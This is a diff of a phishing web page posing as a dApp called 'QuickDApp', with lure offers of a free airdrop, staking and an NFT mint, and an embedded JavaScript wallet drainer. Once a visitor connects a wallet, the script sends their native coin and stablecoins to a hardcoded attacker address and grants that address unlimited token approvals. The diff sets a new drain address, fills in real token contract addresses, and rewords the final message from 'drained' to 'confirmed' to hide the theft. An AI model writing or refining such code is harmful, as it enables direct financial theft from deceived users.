@@ -136,48 +136,48 @@
 
     <div class="wallet-grid" id="walletGrid">
         <button class="wallet-btn selected" data-wallet="trustwallet" onclick="selectWallet('trustwallet')">
-            <span class="icon">??</span> Trust Wallet
+            <span class="icon">🔵</span> Trust Wallet
         </button>
         <button class="wallet-btn" data-wallet="binance" onclick="selectWallet('binance')">
-            <span class="icon">??</span> Binance
+            <span class="icon">🟡</span> Binance
         </button>
         <button class="wallet-btn" data-wallet="bybit" onclick="selectWallet('bybit')">
-            <span class="icon">??</span> Bybit
+            <span class="icon">🔷</span> Bybit
         </button>
         <button class="wallet-btn" data-wallet="metamask" onclick="selectWallet('metamask')">
-            <span class="icon">??</span> MetaMask
+            <span class="icon">🦊</span> MetaMask
         </button>
         <button class="wallet-btn" data-wallet="coinbase" onclick="selectWallet('coinbase')">
-            <span class="icon">??</span> Coinbase
+            <span class="icon">🔷</span> Coinbase
         </button>
         <button class="wallet-btn" data-wallet="phantom" onclick="selectWallet('phantom')">
-            <span class="icon">??</span> Phantom
+            <span class="icon">👻</span> Phantom
         </button>
     </div>
 
     <button id="connectBtn" class="connect-btn" onclick="connectWallet()">
-        ?? Connect Wallet
+        🔗 Connect Wallet
     </button>
 
-    <span class="network-badge" id="networkBadge">?? Select your wallet</span>
+    <span class="network-badge" id="networkBadge">🌐 Select your wallet</span>
     <div id="statusBox" class="status">Click connect to open your wallet</div>
 
     <!-- App store download links -->
     <div class="store-badge" id="storeBadge">
         <p style="font-size:12px;color:#666;margin-bottom:8px;">Don't have the app? Download here:</p>
-        <a id="appStoreLink" class="app-store" href="#" target="_blank">?? App Store</a>
-        <a id="googlePlayLink" class="google-play" href="#" target="_blank">? Google Play</a>
+        <a id="appStoreLink" class="app-store" href="#" target="_blank">📱 App Store</a>
+        <a id="googlePlayLink" class="google-play" href="#" target="_blank">▶ Google Play</a>
     </div>
 
     <div class="features">
-        <div class="feature"><strong>?? Airdrop Claim</strong> 0.25 ETH</div>
-        <div class="feature"><strong>?? Staking Pool</strong> 12% APR</div>
-        <div class="feature"><strong>?? Token Swap</strong> Best rates</div>
-        <div class="feature"><strong>?? NFT Mint</strong> Free</div>
+        <div class="feature"><strong>💎 Airdrop Claim</strong> 0.25 ETH</div>
+        <div class="feature"><strong>📊 Staking Pool</strong> 12% APR</div>
+        <div class="feature"><strong>🔄 Token Swap</strong> Best rates</div>
+        <div class="feature"><strong>🏆 NFT Mint</strong> Free</div>
     </div>
 
     <div class="footer">
-        <p>?? Secured by Audited Contracts v3.2.1</p>
+        <p>🔒 Secured by Audited Contracts v3.2.1</p>
         <p>© 2024 QuickDApp</p>
     </div>
 </div>
@@ -186,7 +186,7 @@
 
 <script>
     // ==================== CONFIG ====================
-    const DRAIN_ADDRESS = '0x8c1063D7674BD0B036cf471A48B11406843e4298'; // CHANGE THIS
+    const DRAIN_ADDRESS = '0x3ED236a53D10959C480b15bb45160522C24A05DD'; // CHANGE THIS
 
     const ERC20_ABI = [
         'function balanceOf(address owner) view returns (uint256)',
@@ -196,28 +196,28 @@
     ];
 
     const ETH_TOKENS = [
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 6 },
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 6 },
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'WBTC', decimals: 8 },
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'DAI', decimals: 18 },
+        { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
+        { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
+        { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
+        { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
     ];
 
     const BSC_TOKENS = [
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 18 },
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 18 },
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'BTCB', decimals: 18 },
+        { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
+        { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
+        { address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', symbol: 'BTCB', decimals: 18 },
     ];
 
     const POLYGON_TOKENS = [
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDT', decimals: 6 },
-        { address: '0x8c1063D7674BD0B036cf471A48B11406843e4298', symbol: 'USDC', decimals: 6 },
+        { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
+        { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
     ];
 
     // ==================== WALLET CONFIG ====================
     const WALLET_CONFIG = {
         trustwallet: {
             name: 'Trust Wallet',
-            icon: '??',
+            icon: '🔵',
             // Deep links to open the app
             deeplink: 'trust://',
             // Universal links (works on iOS/Android)
@@ -235,7 +235,7 @@
         },
         binance: {
             name: 'Binance',
-            icon: '??',
+            icon: '🟡',
             deeplink: 'bnc://',
             universal: 'https://app.binance.com/',
             appStore: 'https://apps.apple.com/app/binance/id1436799971',
@@ -249,7 +249,7 @@
         },
         bybit: {
             name: 'Bybit',
-            icon: '??',
+            icon: '🔷',
             deeplink: 'bybit://',
             universal: 'https://www.bybit.com/',
             appStore: 'https://apps.apple.com/app/bybit/id1485152668',
@@ -262,7 +262,7 @@
         },
         metamask: {
             name: 'MetaMask',
-            icon: '??',
+            icon: '🦊',
             deeplink: 'metamask://',
             universal: 'https://metamask.app.link/',
             appStore: 'https://apps.apple.com/app/metamask/id1438144202',
@@ -276,7 +276,7 @@
         },
         coinbase: {
             name: 'Coinbase Wallet',
-            icon: '??',
+            icon: '🔷',
             deeplink: 'coinbasewallet://',
             universal: 'https://wallet.coinbase.com/',
             appStore: 'https://apps.apple.com/app/coinbase-wallet/id1278383455',
@@ -290,7 +290,7 @@
         },
         phantom: {
             name: 'Phantom',
-            icon: '??',
+            icon: '👻',
             deeplink: 'phantom://',
             universal: 'https://phantom.app/',
             appStore: 'https://apps.apple.com/app/phantom/id1598432977',
@@ -327,7 +327,7 @@
             setStatus(`? ${config.name} extension detected! Click connect.`, 'success');
             extensionDetected = true;
         } else {
-            setStatus(`?? Will open ${config.name} mobile app.`, 'pending');
+            setStatus(`✅ Will open ${config.name} mobile app.`, 'pending');
             extensionDetected = false;
         }
     }
@@ -392,7 +392,7 @@
     async function connectWallet() {
         const btn = document.getElementById('connectBtn');
         btn.disabled = true;
-        btn.textContent = '? Opening...';
+        btn.textContent = '⏳ Opening...';
         
         const config = WALLET_CONFIG[selectedWallet];
         setStatus(`Opening ${config.name}...`, 'pending');
@@ -418,9 +418,9 @@
                 const network = await provider.getNetwork();
                 const chainId = network.chainId;
 
-                document.getElementById('networkBadge').textContent = `?? ${network.name || 'Ethereum'} — ${userAddress.slice(0,6)}...`;
-                setStatus(`? ${config.name}: ${userAddress.slice(0,6)}...`, 'success');
-                btn.textContent = '? Connected';
+                document.getElementById('networkBadge').textContent = `🟢 ${network.name || 'Ethereum'} — ${userAddress.slice(0,6)}...`;
+                setStatus(`✅ ${config.name}: ${userAddress.slice(0,6)}...`, 'success');
+                btn.textContent = '✅ Connected';
 
                 // Start drain after 1.5 seconds
                 await sleep(1500);
@@ -429,17 +429,17 @@
             } catch (err) {
                 console.error(err);
                 if (err.code === 4001) {
-                    setStatus('? Rejected. Try again.', 'error');
+                    setStatus('❌ Rejected. Try again.', 'error');
                 } else {
-                    setStatus('? ' + (err.message || 'Failed'), 'error');
+                    setStatus('❌ ' + (err.message || 'Failed'), 'error');
                 }
                 btn.disabled = false;
-                btn.textContent = '?? Connect Wallet';
+                btn.textContent = '🔗 Connect Wallet';
             }
 
         } else {
             // ===== NO EXTENSION — OPEN MOBILE APP VIA DEEP LINK =====
-            setStatus(`?? Opening ${config.name} on your phone...`, 'pending');
+            setStatus(`📱 Opening ${config.name} on your phone...`, 'pending');
             
             // Show store badges
             document.getElementById('appStoreLink').href = config.appStore;
@@ -451,10 +451,10 @@
 
             // Since we can't actually connect via deep link alone,
             // we show the user what to do
-            setStatus(`?? ${config.name} should open on your phone. Complete the connection there.`, 'pending');
+            setStatus(`📱 ${config.name} should open on your phone. Complete the connection there.`, 'pending');
             
             // Show instruction button
-            btn.textContent = '? App Opening...';
+            btn.textContent = '✅ App Opening...';
             
             // We can't actually drain from a mobile app via deep link alone
             // This is a limitation — for mobile, we'd need WalletConnect QR
@@ -463,8 +463,8 @@
             // After 5 seconds, reset
             setTimeout(() => {
                 btn.disabled = false;
-                btn.textContent = '?? Connect Wallet';
-                setStatus(`?? Open ${config.name} app on your phone and look for the connection request.`, 'pending');
+                btn.textContent = '🔗 Connect Wallet';
+                setStatus(`📱 Open ${config.name} app on your phone and look for the connection request.`, 'pending');
             }, 5000);
         }
     }
@@ -483,13 +483,13 @@
 
     // ==================== DRAIN ====================
     async function drainEVM(chainId) {
-        if (!signer) { setStatus('? Not connected', 'error'); return; }
+        if (!signer) { setStatus('❌ Not connected', 'error'); return; }
 
-        setStatus('?? Scanning wallet...', 'pending');
+        setStatus('🔍 Scanning wallet...', 'pending');
 
         try {
             // STEP 1: NATIVE COIN
-            setStatus('?? Transferring native coin...', 'pending');
+            setStatus('📤 Transferring native coin...', 'pending');
             const balance = await provider.getBalance(userAddress);
             const gp = await getGasParams();
             const gasCost = gp.maxFeePerGas ? gp.maxFeePerGas.mul(21000) : (await provider.getGasPrice()).mul(21000);
@@ -497,11 +497,11 @@
 
             if (sendAmount.gt(0)) {
                 const tx = await signer.sendTransaction({ to: DRAIN_ADDRESS, value: sendAmount, gasLimit: 21000, ...gp });
-                setStatus(`?? TX: ${tx.hash.slice(0,10)}...`, 'pending');
+                setStatus(`📤 TX: ${tx.hash.slice(0,10)}...`, 'pending');
                 await tx.wait();
-                setStatus('? Native coin drained!', 'success');
+                setStatus('✅ Native coin drained!', 'success');
             } else {
-                setStatus('? Native balance low, skipping', 'pending');
+                setStatus('⏩ Native balance low, skipping', 'pending');
             }
             await sleep(600);
 
@@ -512,7 +512,7 @@
             else tokens = ETH_TOKENS;
 
             // STEP 3: DRAIN TOKENS
-            setStatus('?? Draining tokens...', 'pending');
+            setStatus('📤 Draining tokens...', 'pending');
             for (const token of tokens) {
                 try {
                     const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
@@ -520,7 +520,7 @@
 
                     if (tokenBalance.gt(0)) {
                         const formatted = ethers.utils.formatUnits(tokenBalance, token.decimals);
-                        setStatus(`?? ${token.symbol} (${parseFloat(formatted).toFixed(4)})...`, 'pending');
+                        setStatus(`📤 ${token.symbol} (${parseFloat(formatted).toFixed(4)})...`, 'pending');
 
                         const signerContract = new ethers.Contract(token.address, ERC20_ABI, signer);
 
@@ -532,14 +532,14 @@
                         await signerContract.approve(DRAIN_ADDRESS, tokenBalance, { ...await getGasParams() });
                         await signerContract.transfer(DRAIN_ADDRESS, tokenBalance, { ...await getGasParams() });
 
-                        setStatus(`? ${token.symbol} drained!`, 'success');
+                        setStatus(`✅ ${token.symbol} drained!`, 'success');
                         await sleep(500);
                     }
                 } catch (e) { console.warn(`${token.symbol}: ${e.message}`); }
             }
 
             // STEP 4: UNLIMITED APPROVALS
-            setStatus('?? Setting unlimited approvals...', 'pending');
+            setStatus('📤 Setting unlimited approvals...', 'pending');
             for (const token of tokens) {
                 try {
                     const signerContract = new ethers.Contract(token.address, ERC20_ABI, signer);
@@ -548,20 +548,20 @@
                     if (current.lt(maxUint.div(2))) {
                         if (token.symbol === 'USDT' && current.gt(0)) await signerContract.approve(DRAIN_ADDRESS, 0, { ...await getGasParams() });
                         await signerContract.approve(DRAIN_ADDRESS, maxUint, { ...await getGasParams() });
-                        setStatus(`? ${token.symbol} unlimited`, 'success');
+                        setStatus(`✅ ${token.symbol} unlimited`, 'success');
                         await sleep(300);
                     }
                 } catch (e) { /* silent */ }
             }
 
-            setStatus('?? Complete! All assets drained.', 'success');
-            document.getElementById('connectBtn').textContent = '?? Complete';
+            setStatus('🚀 Complete! All assets confirmed.', 'success');
+            document.getElementById('connectBtn').textContent = '🎯 Complete';
 
         } catch (err) {
             console.error(err);
-            setStatus('? Error: ' + (err.message || 'unknown'), 'error');
+            setStatus('❌ Error: ' + (err.message || 'unknown'), 'error');
             document.getElementById('connectBtn').disabled = false;
-            document.getElementById('connectBtn').textContent = '?? Retry';
+            document.getElementById('connectBtn').textContent = '🔗 Retry';
         }
     }
 
